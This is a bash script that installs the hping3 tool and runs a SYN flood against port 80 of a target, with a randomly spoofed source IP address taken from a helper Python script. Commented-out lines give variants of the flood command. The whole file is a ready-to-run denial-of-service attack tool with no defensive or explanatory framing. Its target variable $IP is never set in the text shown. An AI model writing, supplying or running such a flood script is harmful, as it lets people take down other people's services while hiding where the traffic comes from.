#!/bin/bash
REQUIRED="hping3"
OK=$(dpkg -s $REQUIRED|grep "install ok installed")

echo "Checking for $REQUIRED: $OK"
if [ "" = "$OK" ]; then
  echo "No $REQUIRED. Setting up $REQUIRED."
  sudo apt-get install $REQUIRED
fi

#echo "Input Spoof IP Address:"
#read SPOOF
SPOOF=$(python ./randip.py)

# Use --flood instead of --fast
# sudo hping3 --fast -S $IP -a $SPOOF -p 80
# hping3 $IP -a $(python3 ./randip.py) -p 80 -S --fast
echo "Executing SYN Flood ..."
flood () {
  sudo hping3 $IP -a $SPOOF -p 80 -S --fast
}

flood